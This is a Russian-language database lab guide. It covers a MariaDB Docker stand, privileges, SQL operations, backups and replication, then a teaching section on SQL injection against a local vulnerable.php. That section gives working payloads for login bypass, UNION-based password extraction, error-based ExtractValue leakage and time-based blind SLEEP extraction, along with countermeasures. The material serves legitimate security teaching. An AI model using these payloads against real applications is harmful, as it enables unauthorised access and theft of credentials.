# Подготовка стенда

## Запуск стенда

```bash
root@vm-ubnt:/opt/lab_db# cd /opt/lab_db/
root@vm-ubnt:/opt/lab_db# docker compose up -d
[+] Running 4/4
 ✔ Container mariadb_master  Running                                                                                                                    0.0s
 ✔ Container php_fpm_lab     Running                                                                                                                    0.0s
 ✔ Container nginx_lab       Running                                                                                                                    0.0s
 ✔ Container mariadb_slave   Started                                                                                                                    0.0s
root@vm-ubnt:/opt/lab_db# docker compose ps
NAME             IMAGE               COMMAND                  SERVICE          CREATED          STATUS          PORTS
mariadb_master   mariadb:11          "docker-entrypoint.s…"   mariadb-master   29 seconds ago   Up 27 seconds   0.0.0.0:3307->3306/tcp, :::3307->3306/tcp
nginx_lab        nginx:1.25-alpine   "/docker-entrypoint.…"   nginx            29 seconds ago   Up 22 seconds   0.0.0.0:8000->80/tcp, :::8000->80/tcp
php_fpm_lab      php:8.1-fpm         "docker-php-entrypoi…"   php-fpm          29 seconds ago   Up 24 seconds   9000/tcp
```

Проверка работы базы данных master:
```bash
root@vm-ubnt:/opt/lab_db# mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SELECT VERSION(), DATABASE();"
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------------------------+------------+
| VERSION()                  | DATABASE() |
+----------------------------+------------+
| 11.8.3-MariaDB-ubu2404-log | NULL       |
+----------------------------+------------+
```

# Аутентификация и управление привилегиями

Команды:
```
-- 1) Создаём нового пользователя 'reporter'@'localhost' с паролем 'rptpass'.
--    Поскольку мы указываем 'localhost', этот пользователь сможет подключаться только с хоста,
--    где запущен сервер (внутри контейнера/на той же машине). Если нужен доступ снаружи,
--    используйте '%' вместо 'localhost'.
CREATE USER 'reporter'@'localhost' IDENTIFIED BY 'rptpass';

-- 2) Даём пользователю право только на выполнение SELECT над таблицей demo.users.
--    Это пример принципа наименьших привилегий: веб/отчётный юзер может только читать.
GRANT SELECT ON demo.users TO 'reporter'@'localhost';

-- 3) Применяем изменения привилегий в памяти. В современных MariaDB/MySQL часто
--    это не обязательно после GRANT, но FLUSH PRIVILEGES гарантирует актуальность таблицы привилегий.
FLUSH PRIVILEGES;

-- 4) Проверяем, какие привилегии действительно назначены пользователю.
--    Команда вернёт SQL-предписания, которые показывают текущие grants.
SHOW GRANTS FOR 'reporter'@'localhost';

-- 5) Отзываем ранее выданное право SELECT на таблицу demo.users.
--    После этого пользователь потеряет возможность читать эту таблицу.
REVOKE SELECT ON demo.users FROM 'reporter'@'localhost';

-- 6) Удаляем пользователя из системы. После DROP USER учётная запись удалена окончательно.
DROP USER 'reporter'@'localhost';
```

Пример:
```bash
root@vm-ubnt:/opt/lab_db# mysql -h 127.0.0.1 -P 3307 -u root -prootpass
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 6
Server version: 11.8.3-MariaDB-ubu2404-log mariadb.org binary distribution

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> CREATE USER 'reporter'@'localhost' IDENTIFIED BY 'rptpass';
Query OK, 0 rows affected (0.00 sec)

mysql> GRANT SELECT ON demo.users TO 'reporter'@'localhost';
Query OK, 0 rows affected (0.00 sec)

mysql> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.00 sec)

mysql> SHOW GRANTS FOR 'reporter'@'localhost';
+-----------------------------------------------------------------------------------------------------------------+
| Grants for reporter@localhost                                                                                   |
+-----------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO `reporter`@`localhost` IDENTIFIED BY PASSWORD '*E1FBF912406F75E6B81B1C2E3ED4CF93C85C4F4F' |
| GRANT SELECT ON `demo`.`users` TO `reporter`@`localhost`                                                        |
+-----------------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> REVOKE SELECT ON demo.users FROM 'reporter'@'localhost';
Query OK, 0 rows affected (0.01 sec)

mysql> DROP USER 'reporter'@'localhost';
Query OK, 0 rows affected (0.00 sec)

mysql> ;
ERROR:
No query specified

mysql> q
    -> exit
    -> ^C
mysql> ;
ERROR:
No query specified

mysql> quit
Bye
```
# Операции с таблицами и данными

1. Создание таблиц (DDL)
USE demo;

-- 1.1 Простая таблица products
CREATE TABLE IF NOT EXISTS products (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(150) NOT NULL,
  price DECIMAL(10,2) NOT NULL,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- 1.2 Таблица orders с внешним ключом
CREATE TABLE IF NOT EXISTS orders (
  id INT AUTO_INCREMENT PRIMARY KEY,
  product_id INT NOT NULL,
  qty INT NOT NULL,
  order_date DATETIME DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT fk_product FOREIGN KEY (product_id) REFERENCES products(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;


Комментарий: покажи разницу между первичным ключом и внешним ключом; InnoDB поддерживает транзакции и FK.

2. Вставка данных (INSERT)
-- одиночная вставка
INSERT INTO products (name, price) VALUES ('Apple', 1.20);

-- множественная вставка
INSERT INTO products (name, price) VALUES
  ('Banana', 0.80),
  ('Orange', 1.00),
  ('Grapes', 2.50);

-- вставка с явным указанием столбцов (без created_at)
INSERT INTO orders (product_id, qty) VALUES (1, 10);


Комментарий: показать LAST_INSERT_ID() после автоинкремента.

-- получить id последней вставки в сессии
SELECT LAST_INSERT_ID();

3. Чтение данных (SELECT)
-- все строки
SELECT * FROM products;

-- выборка с фильтром и сортировкой
SELECT id, name, price FROM products WHERE price > 1.00 ORDER BY price DESC LIMIT 10;

-- агрегаты и группировка
SELECT product_id, SUM(qty) AS total_qty FROM orders GROUP BY product_id;

-- выборка с JOIN
SELECT o.id AS order_id, p.name, o.qty
FROM orders o
JOIN products p ON o.product_id = p.id;


Покажи EXPLAIN для сложного запроса (см. §7).

4. Обновление и удаление (UPDATE / DELETE)
-- обновление
UPDATE products SET price = price * 1.10 WHERE name = 'Apple';

-- частичное обновление (только одно поле)
UPDATE products SET name = 'Green Apple' WHERE id = 1;

-- удаление строк
DELETE FROM products WHERE id = 4;

-- очистить всю таблицу быстро (TRUNCATE)
TRUNCATE TABLE temp_table; -- быстрее, чем DELETE без WHERE, но удаляет автосчётчик


Комментарий: объясни разницу между DELETE и TRUNCATE (TRUNCATE DDL — сбрасывает автоинкремент, не транзакционен в некоторых СУБД).

5. Изменение структуры (ALTER)
-- добавить столбец
ALTER TABLE products ADD COLUMN sku VARCHAR(50) AFTER name;

-- изменить тип колонки
ALTER TABLE products MODIFY price DECIMAL(12,2) NOT NULL;

-- удалить колонку
ALTER TABLE products DROP COLUMN sku;

-- добавить индекс
ALTER TABLE products ADD INDEX idx_price (price);


Комментарий: изменение структуры больших таблиц может быть дорого; на занятии покажи на небольшой таблице.

6. Индексы и их использование
-- создать индекс (если не сделали через ALTER)
CREATE INDEX idx_name ON products(name);

-- удалить индекс
DROP INDEX idx_name ON products;

-- посмотреть существующие индексы
SHOW INDEX FROM products;


Поясни: индексы ускоряют SELECT, замедляют INSERT/UPDATE и занимают место.

7. План выполнения — EXPLAIN и EXPLAIN PARTITIONS
-- показать план запроса
EXPLAIN SELECT o.id, p.name FROM orders o JOIN products p ON o.product_id = p.id WHERE p.price > 1.0;

-- показать, какие партиции сканируются (если таблица partitioned)
EXPLAIN PARTITIONS SELECT * FROM userslogs WHERE created >= '2019-01-01';


Поясни: EXPLAIN показывает порядок доступа, использование индексов, тип соединений.

8. Транзакции, COMMIT, ROLLBACK и уровни изоляции
-- начать транзакцию, выполнить операции и зафиксировать
START TRANSACTION;
INSERT INTO products (name, price) VALUES ('Kiwi', 1.40);
UPDATE products SET price = price + 0.1 WHERE id = 2;
COMMIT;

-- откат транзакции
START TRANSACTION;
DELETE FROM products WHERE id = 3;
ROLLBACK; -- отменит DELETE

-- посмотреть текущий уровень изоляции
SELECT @@transaction_isolation;

-- установить уровень изоляции сессии (пример)
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;


Демонстрация блокировок:
В двух сессиях:

Сессия A:

START TRANSACTION;
SELECT * FROM products WHERE id = 1 FOR UPDATE; -- захватит эксклюзивную блокировку


Сессия B попытается:

UPDATE products SET price = price + 0.1 WHERE id = 1; -- будет ждать, пока транзакция A не закоммитит/роллбекнет


Покажи ожидание и затем COMMIT в сессии A — B продолжит.

9. Bulk load — LOAD DATA INFILE (локальный вариант)

В Docker-среде проще загружать через mysql client, либо использовать LOAD DATA LOCAL INFILE.

Пример CSV products.csv:

name,price
Pear,1.10
Mango,2.00


SQL:

LOAD DATA LOCAL INFILE '/tmp/products.csv'
INTO TABLE products
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"'
LINES TERMINATED BY '\n'
IGNORE 1 LINES
(name, price);


Комментарий: разреши LOCAL INFILE в клиенте; в Docker лучше копировать файл в контейнер и читать оттуда.

10. Работа с партиционированными таблицами (демо)
-- показать партиции
SHOW CREATE TABLE userslogs\G

-- добавить партицию (пример)
ALTER TABLE userslogs ADD PARTITION (PARTITION p2021 VALUES LESS THAN (2022));

-- удалить партицию
ALTER TABLE userslogs DROP PARTITION (p2018);


Комментарий: изменения партиций влияют на физическое распределение данных; покажи EXPLAIN PARTITIONS.

11. Удаление таблиц и очистка окружения
-- удалить таблицу
DROP TABLE IF EXISTS orders;

-- удалить БД (в демонстрации осторожно)
DROP DATABASE IF EXISTS tempdb;



🧩 3. Резервное копирование (Backup & Restore)
🔹 1. Проверить наличие данных

Перед началом убедимся, что в базе demo есть таблицы и данные.

USE demo;
SHOW TABLES;
SELECT * FROM users LIMIT 5;

🔹 2. Полное резервное копирование (mysqldump)

💬 Сохраняем полную копию базы данных demo в SQL-файл.

# Выполнить внутри контейнера master
mysqldump -u root -p demo > /backup/demo_full.sql


🔸 mysqldump — утилита для создания текстового дампа БД.
🔸 /backup — каталог, смонтированный в контейнер (например, ./backup на хосте).
🔸 В результате создаётся SQL-файл, содержащий все команды для восстановления структуры и данных.

🔹 3. Частичное резервное копирование (только таблица)

💬 Создадим дамп только таблицы users.

mysqldump -u root -p demo users > /backup/users_table.sql

🔹 4. Резервное копирование только структуры (без данных)

💬 Полезно для документирования схемы БД.

mysqldump -u root -p --no-data demo > /backup/demo_schema.sql

(apt install -y mariadb-client)
root@vm-ubnt:/opt/lab_db# mysqldump -h 127.0.0.1 -P 3307 -u root -p demo > backup/demo_full.sql



🔹 5. Восстановление базы данных из резервной копии

💬 Удалим и восстановим базу demo из файла резервной копии.

mysql -u root -p -e "DROP DATABASE demo;"
mysql -u root -p -e "CREATE DATABASE demo;"
mysql -u root -p demo < /backup/demo_full.sql

mysql -h 127.0.0.1 -P 3307 -u root -p demo < backup/demo_full.sql


🔸 После выполнения этих команд база будет полностью восстановлена в том состоянии, в котором была при создании бэкапа.

🔹 6. Проверка восстановления
USE demo;
SHOW TABLES;
SELECT COUNT(*) FROM users;

🔹 7. Автоматизация резервного копирования (опционально)

💬 Можно создать cron-задачу для ежедневного бэкапа.

Пример простого скрипта /usr/local/bin/backup_demo.sh:

#!/bin/bash
DATE=$(date +%F_%H-%M)
mysqldump -u root -pPassword123 demo > /backup/demo_$DATE.sql
find /backup -type f -mtime +7 -delete   # удаляем бэкапы старше 7 дней


Добавляем в cron:

echo "0 3 * * * /usr/local/bin/backup_demo.sh" >> /etc/crontab


# Репликация

Подключаемся к мастеру:

docker exec -it mariadb_master mariadb -u root -p


Выполняем SQL:

-- создаём пользователя репликации
CREATE USER 'replicator'@'%' IDENTIFIED BY 'ReplPass123';

-- выдаём права на чтение бинарных логов
GRANT REPLICATION SLAVE ON *.* TO 'replicator'@'%';

-- применяем привилегии
FLUSH PRIVILEGES;

-- проверяем статус бинарных логов
SHOW MASTER STATUS;


Пример вывода:

File: mysql-bin.000003
Position: 456


Эти значения (File и Position) понадобятся при настройке слейва.

⚙️ 3️⃣ Настройка слейва

Подключаемся к слейву:

docker exec -it mariadb_slave mariadb -u root -p


Выполняем SQL:

-- указываем параметры мастера
CHANGE MASTER TO
  MASTER_HOST='mariadb_master',
  MASTER_USER='replicator',
  MASTER_PASSWORD='ReplPass123',
  MASTER_PORT=3306,
  MASTER_LOG_FILE='mysql-bin.000003',
  MASTER_LOG_POS=456,
  GET_MASTER_PUBLIC_KEY=1;

-- запускаем репликацию
START SLAVE;

-- проверяем состояние
SHOW SLAVE STATUS\G


✅ Важно, чтобы поля Slave_IO_Running и Slave_SQL_Running были Yes.
Это значит, что репликация установлена и работает корректно.

🧩 4️⃣ Проверка работы репликации

На мастере:

docker exec -it mariadb_master mariadb -u root -p demo

CREATE TABLE test_repl (id INT PRIMARY KEY, msg VARCHAR(50));
INSERT INTO test_repl VALUES (1, 'Replication works!');


Теперь на слейве:

docker exec -it mariadb_slave mariadb -u root -p demo

SELECT * FROM test_repl;


Ожидаемый результат:

+----+-------------------+
| id | msg               |
+----+-------------------+
|  1 | Replication works!|
+----+-------------------+


🎯 Репликация работает!

🔒 5️⃣ Проверка режима read_only

На слейве:

INSERT INTO test_repl VALUES (2, 'Slave insert test');


Результат:

ERROR 1290 (HY000): The MySQL server is running with the --read-only option so it cannot execute this statement


💬 Это ожидаемое поведение — на ведомом сервере нельзя вносить изменения вручную.

🌀 6️⃣ Остановка и запуск репликации вручную
STOP SLAVE;
START SLAVE;
SHOW SLAVE STATUS\G

Важное предупреждение

Демонстрации инъекций приводятся только для учебных целей и выполняются исключительно в локальной тестовой среде. Не повторять на чужих/публичных серверах. Не использовать destructive payload'ы (DROP/DELETE) — в этой лабораторке мы показываем только чтение (EXFILTRATION) и диагностические векторы.

1. Подготовка (быстрая проверка)

Убедись, что контейнеры запущены:

docker compose ps
# Проверка доступа к БД
mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SELECT COUNT(*) FROM demo.users;"
# Открыть веб-страницу: http://localhost:8000/vulnerable.php

2. Быстрая настройка логирования (чтобы видеть сформированные SQL)

Включаем general_log (лог в таблицу), делаем запросы, затем выключаем:

-- выполнить на master
mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SET GLOBAL log_output='TABLE'; SET GLOBAL general_log = 'ON';"
# потом после демонстрации
mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SET GLOBAL general_log = 'OFF';"


Посмотреть недавние запросы:

mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SELECT event_time, user_host, argument FROM mysql.general_log WHERE command_type='Query' ORDER BY event_time DESC LIMIT 50\G"

3. Демонстрация 1 — обход авторизации (login bypass)

Что показываем: уязвимый vulnerable.php конкатенирует ввод — простой bypass.

Открой страницу:

http://localhost:8000/vulnerable.php


Введи:

username: admin

password: ' OR '1'='1

Нажми Login.

Что происходит:

На странице видно поле Executed SQL, например:

SELECT id, username, role FROM users WHERE username='admin' AND password='' OR '1'='1' LIMIT 1


Сервер вернёт строку(и) — обход авторизации.

Пояснение: '1'='1' — всегда истинно, условие WHERE удовлетворяется.

Просмотр в логе:

mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SELECT event_time, argument FROM mysql.general_log WHERE argument LIKE '%SELECT id, username, role FROM users%' ORDER BY event_time DESC LIMIT 5\G"

4. Демонстрация 2 — экранирование хвоста запроса (комментарии)

Payload в поле password:

' OR '1'='1' -- 


-- превращает остаток запроса в комментарий (MySQL-style). Попроси студентов объяснить разницу между этим и предыдущим примером.

5. Демонстрация 3 — UNION-based (чтение другой таблицы)

Цель: показать, что при совпадении числа и типов колонок можно вытянуть другие данные.
Важно: используем только SELECT, не destructive.

Пример (теоретический / осторожно): если уязвимый запрос имеет 3 колонки (id, username, role), можно попробовать:

' UNION SELECT id, username, password FROM users -- 


В vulnerable.php это может вернуть столбец password (если типы совпадут). На практике сначала протестируй на локальной копии и подскажи студентам, что UNION требует совместимости колонок.

6. Демонстрация 4 — error-based exfiltration (ExtractValue)

Что показывает: как текст ошибки может содержать данные (имя БД, значения).

Запусти в mysql (master):

mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "USE demo; SELECT ExtractValue(1, CONCAT(0x5C, (SELECT DATABASE())));"


Ожидаемый результат: ошибка типа

Error Code: 1105. XPATH syntax error: '\demo'


Поясни: злоумышленник формирует выражение, которое вызывает ошибку — и в тексте ошибки попадает значение подзапроса.

7. Демонстрация 5 — blind/time-based injection (SLEEP)

Когда используется: если приложение не возвращает данные напрямую.
Payload (для демонстрации в локальной среде):

' OR IF( (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0) -- 


Поясни: измеряя задержку ответа, можно восстановить значения побайтно. Показать один пример (не полный exfiltration).

8. Логи и доказательства (как увидеть, что инъекция сработала)

Включённый general_log покажет сформированный SQL.

Выполни поиск в логе по части запроса:

mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SELECT event_time, argument FROM mysql.general_log WHERE argument LIKE '%OR %1%=%1%' ORDER BY event_time DESC LIMIT 20\G"


(адаптируй LIKE под реальный SQL, который видишь)

9. Как фиксировать — контрмеры (обязательно обсудить)

Prepared statements (параметризованные запросы) — главная мера.
Пример на PHP (у тебя в safe.php):

$stmt = $pdo->prepare('SELECT id, username, role FROM users WHERE username = :u AND password = :p LIMIT 1');
$stmt->execute([':u' => $username, ':p' => $password]);


Хеширование паролей — не хранить пароли в открытом виде; использовать password_hash()/password_verify() (bcrypt/argon2).

Whitelist/валидация входа — для ID/чисел использовать строгую проверку (ctype_digit, приведение в int); для строк — разрешать только ожидаемые символы.

Минимальные привилегии — учётная запись веб-приложения должна иметь лишь нужные привилегии (SELECT/INSERT/...), никогда DROP/GRANT/SUPER. Демонстрируй на примере webapp.

Неинформативные сообщения об ошибках — в проде скрывать текст ошибок от клиента, логировать их серверно.

WAF и IPS — дополнительный уровень защиты, но не замена правильной разработки.

Аудит и мониторинг — логировать необычные запросы, уведомления при всплесках.

10. Практические упражнения для студентов (варианты)

Выполните login bypass на vulnerable.php и зафиксируйте сформированный SQL в mysql.general_log.

Модифицируйте vulnerable.php на сервере (локально) — перепишите на PDO и убедитесь, что тот же payload не работает.

Создайте пользователя с минимальными правами webapp (у тебя уже есть) и покажите, что даже при уязвимом коде он не может выполнить DDL.

(Опционально) Сымитируйте error-based exfiltration, получите имя БД через ExtractValue и объясните механизм.

Напишите краткий чек-лист контрмер для команды разработчиков (5 пунктов).

11. Полезные команды — копировать/вставлять

Включить логирование:

mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SET GLOBAL log_output='TABLE'; SET GLOBAL general_log='ON';"


Посмотреть логи (последние 20):

mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "SELECT event_time,user_host,argument FROM mysql.general_log WHERE command_type='Query' ORDER BY event_time DESC LIMIT 20\G"


Пример error-based (ExtractValue):

mysql -h 127.0.0.1 -P 3307 -u root -prootpass -e "USE demo; SELECT ExtractValue(1, CONCAT(0x5C,(SELECT DATABASE())));"


Пример time-based (демо, НЕ запускать в цикле):

# демонстрационная проверка 1-го символа пароля admin на 'a'
curl "http://localhost:8000/vulnerable.php?username=admin&password=' OR IF((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a', SLEEP(3),0)-- "

